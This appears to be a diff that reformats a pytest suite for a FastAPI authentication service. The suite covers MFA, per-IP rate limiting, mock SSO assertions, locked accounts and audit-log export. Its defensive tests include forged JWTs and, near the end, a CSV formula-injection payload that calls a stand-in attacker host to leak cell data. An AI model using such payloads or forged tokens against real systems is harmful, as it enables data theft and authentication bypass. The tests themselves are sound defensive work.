@@ -1,24 +1,24 @@
-import pytest
 import csv
 import io
+from datetime import UTC, datetime, timedelta
+
+import pytest
 from fastapi import HTTPException
 from fastapi.testclient import TestClient
 
 from app.core import config as app_config
 from app.database import SessionLocal
 from app.main import app
-from app.services import mfa_service
+from app.models.auth_audit_logs import AuthAuditLog
+from app.models.users import User
+from app.services import mfa_service, rate_limit_service
+from app.services.abuse_dashboard_service import get_abuse_dashboard
 from app.services.rate_limit_service import (
-    MFA_ABUSE,
     LOGIN_BRUTE_FORCE,
+    MFA_ABUSE,
     RATE_LIMIT_EXCEEDED,
     check_rate_limit,
 )
-from datetime import datetime, timedelta, timezone
-from app.models.auth_audit_logs import AuthAuditLog
-from app.models.users import User
-from app.services import rate_limit_service
-from app.services.abuse_dashboard_service import get_abuse_dashboard
 
 client = TestClient(app)
 
@@ -42,7 +42,12 @@ def mfa_on(monkeypatch):
 @pytest.fixture
 def sso_on(monkeypatch):
     monkeypatch.setattr(app_config, "MOCK_SSO_ENABLED", True)
-    monkeypatch.setattr(app_config, "MOCK_SSO_SECRET",  "test-sso-secret-0123456789abcdef-xyz",)
+    monkeypatch.setattr(
+        app_config,
+        "MOCK_SSO_SECRET",
+        "test-sso-secret-0123456789abcdef-xyz",
+    )
+
 
 def _export(admin_token):
     r = client.get(
@@ -55,6 +60,7 @@ def _export(admin_token):
 
 # ---------------- MFA ----------------
 
+
 def test_login_without_mfa_still_returns_tokens():
     r = client.post("/api/v1/auth/login", data=ANALYST)
     assert r.status_code == 200
@@ -62,7 +68,7 @@ def test_login_without_mfa_still_returns_tokens():
 
 
 def test_mfa_end_to_end_and_audited(monkeypatch):
-    admin = _token(CEO)                       # before MFA is switched on
+    admin = _token(CEO)  # before MFA is switched on
     monkeypatch.setattr(app_config, "MFA_ENABLED", True)
     monkeypatch.setattr(app_config, "MFA_MOCK_OTP", "246810")
 
@@ -70,14 +76,20 @@ def test_mfa_end_to_end_and_audited(monkeypatch):
     assert r.json()["mfa_required"] is True
     challenge = r.json()["challenge_id"]
 
-    wrong = client.post("/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "000000"})
+    wrong = client.post(
+        "/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "000000"}
+    )
     assert wrong.status_code == 401
 
-    ok = client.post("/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "246810"})
+    ok = client.post(
+        "/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "246810"}
+    )
     assert ok.status_code == 200
     assert "access_token" in ok.json()
 
-    reuse = client.post("/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "246810"})
+    reuse = client.post(
+        "/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "246810"}
+    )
     assert reuse.status_code == 401
 
     csv_text = _export(admin)
@@ -103,10 +115,15 @@ def test_otp_is_random_when_no_mock_otp(monkeypatch):
 
 # ---------------- Rate limiting ----------------
 
+
 def test_rate_limit_is_per_ip_not_global():
     db = SessionLocal()
     try:
-        kwargs = dict(db=db, endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)
+        kwargs = {
+            "db": db,
+            "endpoint": "/api/v1/auth/mfa/verify",
+            "abuse_event_type": MFA_ABUSE,
+        }
 
         for _ in range(5):
             check_rate_limit(ip_address="10.0.0.1", **kwargs)
@@ -123,13 +140,17 @@ def test_rate_limit_is_per_ip_not_global():
 
 # ---------------- SSO ----------------
 
+
 def test_sso_accepts_signed_assertion_and_is_audited(sso_on):
     from app.services.sso_service import create_mock_sso_assertion
 
     admin = _token(CEO)
     r = client.post(
         "/api/v1/auth/sso/login",
-        json={"provider": "mock-enterprise-sso", "assertion": create_mock_sso_assertion("enterprise-002")},
+        json={
+            "provider": "mock-enterprise-sso",
+            "assertion": create_mock_sso_assertion("enterprise-002"),
+        },
     )
     assert r.status_code == 200
     assert r.json()["auth_type"] == "federated-sso"
@@ -140,9 +161,14 @@ def test_sso_rejects_assertion_signed_with_wrong_secret(sso_on, monkeypatch):
     from app.services.sso_service import create_mock_sso_assertion
 
     forged = create_mock_sso_assertion("enterprise-001")
-    monkeypatch.setattr(app_config, "MOCK_SSO_SECRET", "different-sso-secret-0123456789abcdef")
+    monkeypatch.setattr(
+        app_config, "MOCK_SSO_SECRET", "different-sso-secret-0123456789abcdef"
+    )
 
-    r = client.post("/api/v1/auth/sso/login", json={"provider": "mock-enterprise-sso", "assertion": forged})
+    r = client.post(
+        "/api/v1/auth/sso/login",
+        json={"provider": "mock-enterprise-sso", "assertion": forged},
+    )
     assert r.status_code == 401
 
 
@@ -161,20 +187,35 @@ def test_sso_rejects_plain_client_fields():
 
 
 def test_sso_disabled_by_default():
-    r = client.post("/api/v1/auth/sso/login", json={"provider": "mock-enterprise-sso", "assertion": "x"})
+    r = client.post(
+        "/api/v1/auth/sso/login",
+        json={"provider": "mock-enterprise-sso", "assertion": "x"},
+    )
     assert r.status_code == 404
+
 
 def test_sso_refuses_blank_secret(monkeypatch):
     monkeypatch.setattr(app_config, "MOCK_SSO_ENABLED", True)
     monkeypatch.setattr(app_config, "MOCK_SSO_SECRET", "")
     from jose import jwt
+
     forged = jwt.encode(
-        {"iss": "mock-enterprise-sso", "aud": "eaicsp-platform", "sub": "x",
-         "email": "ceo@company.com", "exp": 9999999999},
-        "", algorithm="HS256",
+        {
+            "iss": "mock-enterprise-sso",
+            "aud": "eaicsp-platform",
+            "sub": "x",
+            "email": "ceo@company.com",
+            "exp": 9999999999,
+        },
+        "",
+        algorithm="HS256",
     )
-    r = client.post("/api/v1/auth/sso/login", json={"provider": "mock-enterprise-sso", "assertion": forged})
+    r = client.post(
+        "/api/v1/auth/sso/login",
+        json={"provider": "mock-enterprise-sso", "assertion": forged},
+    )
     assert r.status_code == 503
+
 
 def test_env_example_does_not_ship_a_usable_sso_secret():
     from pathlib import Path
@@ -184,8 +225,10 @@ def test_env_example_does_not_ship_a_usable_sso_secret():
         if line.startswith("MOCK_SSO_SECRET="):
             # Must be blank so the startup check forces a real secret.
             assert line.split("=", 1)[1].strip() == ""
-            
+
+
 # ---------------- Audit export / abuse dashboard ----------------
+
 
 def test_audit_export_has_compliance_columns():
     header = _export(_token(CEO)).splitlines()[0]
@@ -197,18 +240,27 @@ def test_supplier_cannot_export_or_view_abuse_dashboard():
     headers = {"Authorization": f"Bearer {token}"}
 
     assert client.get("/api/v1/admin/audit/export", headers=headers).status_code == 403
-    assert client.get("/api/v1/admin/abuse/dashboard", headers=headers).status_code == 403
+    assert (
+        client.get("/api/v1/admin/abuse/dashboard", headers=headers).status_code == 403
+    )
+
 
 def test_audit_export_limit_is_applied():
     admin = _token(CEO)
     _token(CEO)  # at least two audit rows
-    r = client.get("/api/v1/admin/audit/export?limit=1", headers={"Authorization": f"Bearer {admin}"})
-    assert len(r.text.strip().splitlines()) == 2   # header + 1 row
+    r = client.get(
+        "/api/v1/admin/audit/export?limit=1",
+        headers={"Authorization": f"Bearer {admin}"},
+    )
+    assert len(r.text.strip().splitlines()) == 2  # header + 1 row
 
 
 def test_audit_export_json_format():
     admin = _token(CEO)
-    r = client.get("/api/v1/admin/audit/export?output_format=json", headers={"Authorization": f"Bearer {admin}"})
+    r = client.get(
+        "/api/v1/admin/audit/export?output_format=json",
+        headers={"Authorization": f"Bearer {admin}"},
+    )
     assert r.status_code == 200
     assert r.headers["content-type"].startswith("application/json")
     assert {"timestamp", "actor_email", "action", "outcome"} <= set(r.json()[0])
@@ -226,7 +278,7 @@ def _set_locked_until(email, value):
 
 def test_locked_user_with_valid_token_gets_401_not_500():
     token = _token(ANALYST)
-    _set_locked_until(ANALYST["username"], datetime.now(timezone.utc) + timedelta(minutes=15))
+    _set_locked_until(ANALYST["username"], datetime.now(UTC) + timedelta(minutes=15))
     try:
         r = client.get("/api/v1/users/me", headers={"Authorization": f"Bearer {token}"})
         assert r.status_code == 401
@@ -237,11 +289,16 @@ def test_locked_user_with_valid_token_gets_401_not_500():
 def test_sso_refuses_a_locked_account(sso_on):
     from app.services.sso_service import create_mock_sso_assertion
 
-    _set_locked_until("vpoperations@company.com", datetime.now(timezone.utc) + timedelta(minutes=15))
+    _set_locked_until(
+        "vpoperations@company.com", datetime.now(UTC) + timedelta(minutes=15)
+    )
     try:
         r = client.post(
             "/api/v1/auth/sso/login",
-            json={"provider": "mock-enterprise-sso", "assertion": create_mock_sso_assertion("enterprise-002")},
+            json={
+                "provider": "mock-enterprise-sso",
+                "assertion": create_mock_sso_assertion("enterprise-002"),
+            },
         )
         assert r.status_code == 401
     finally:
@@ -251,7 +308,11 @@ def test_sso_refuses_a_locked_account(sso_on):
 def test_changing_caller_header_does_not_reset_the_limit():
     db = SessionLocal()
     try:
-        kwargs = dict(db=db, ip_address="10.9.9.9", endpoint="/api/v1/auth/verify")
+        kwargs = {
+            "db": db,
+            "ip_address": "10.9.9.9",
+            "endpoint": "/api/v1/auth/verify",
+        }
 
         # 100 requests, each claiming to be a different, made-up service.
         for i in range(100):
@@ -271,7 +332,12 @@ def test_rejected_requests_write_one_audit_row_per_window():
     db = SessionLocal()
     ip = "10.8.8.8"
     try:
-        kwargs = dict(db=db, ip_address=ip, endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)
+        kwargs = {
+            "db": db,
+            "ip_address": ip,
+            "endpoint": "/api/v1/auth/mfa/verify",
+            "abuse_event_type": MFA_ABUSE,
+        }
         for _ in range(5):
             check_rate_limit(**kwargs)
 
@@ -281,7 +347,10 @@ def test_rejected_requests_write_one_audit_row_per_window():
 
         rows = (
             db.query(AuthAuditLog)
-            .filter(AuthAuditLog.event_type == RATE_LIMIT_EXCEEDED, AuthAuditLog.ip_address == ip)
+            .filter(
+                AuthAuditLog.event_type == RATE_LIMIT_EXCEEDED,
+                AuthAuditLog.ip_address == ip,
+            )
             .count()
         )
         assert rows == 1
@@ -293,7 +362,12 @@ def test_login_brute_force_shows_on_abuse_dashboard():
     db = SessionLocal()
     ip = "10.7.7.7"
     try:
-        kwargs = dict(db=db, ip_address=ip, endpoint="/api/v1/auth/login", abuse_event_type=LOGIN_BRUTE_FORCE)
+        kwargs = {
+            "db": db,
+            "ip_address": ip,
+            "endpoint": "/api/v1/auth/login",
+            "abuse_event_type": LOGIN_BRUTE_FORCE,
+        }
         for _ in range(20):
             check_rate_limit(**kwargs)
         with pytest.raises(HTTPException):
@@ -304,14 +378,17 @@ def test_login_brute_force_shows_on_abuse_dashboard():
         assert dashboard["rate_limit_violations_by_type"][LOGIN_BRUTE_FORCE] >= 1
         assert dashboard["rate_limit_violations"] >= 1
         assert any(entry["ip_address"] == ip for entry in dashboard["top_ips"])
-        assert any(entry["endpoint"] == "/api/v1/auth/login" for entry in dashboard["top_endpoints"])
+        assert any(
+            entry["endpoint"] == "/api/v1/auth/login"
+            for entry in dashboard["top_endpoints"]
+        )
     finally:
         db.close()
 
 
 def test_login_request_does_not_clear_an_active_mfa_bucket(monkeypatch):
     """Idle-bucket cleanup must use the longest window (300s MFA), not 60s."""
-    start = datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc)
+    start = datetime(2026, 1, 1, 12, 0, tzinfo=UTC)
     clock = {"now": start}
 
     class FakeDateTime(datetime):
@@ -323,7 +400,12 @@ def test_login_request_does_not_clear_an_active_mfa_bucket(monkeypatch):
 
     db = SessionLocal()
     try:
-        mfa = dict(db=db, ip_address="10.6.6.6", endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)
+        mfa = {
+            "db": db,
+            "ip_address": "10.6.6.6",
+            "endpoint": "/api/v1/auth/mfa/verify",
+            "abuse_event_type": MFA_ABUSE,
+        }
         for _ in range(5):
             check_rate_limit(**mfa)
 
@@ -342,7 +424,9 @@ def test_audit_export_csv_neutralises_formulas():
 
     # A failed login stores the raw username the attacker typed.
     payload = '=HYPERLINK("http://evil.example/?"&A1,"x")'
-    client.post("/api/v1/auth/login", data={"username": payload, "password": "wrong-password"})
+    client.post(
+        "/api/v1/auth/login", data={"username": payload, "password": "wrong-password"}
+    )
 
     db = SessionLocal()
     try:
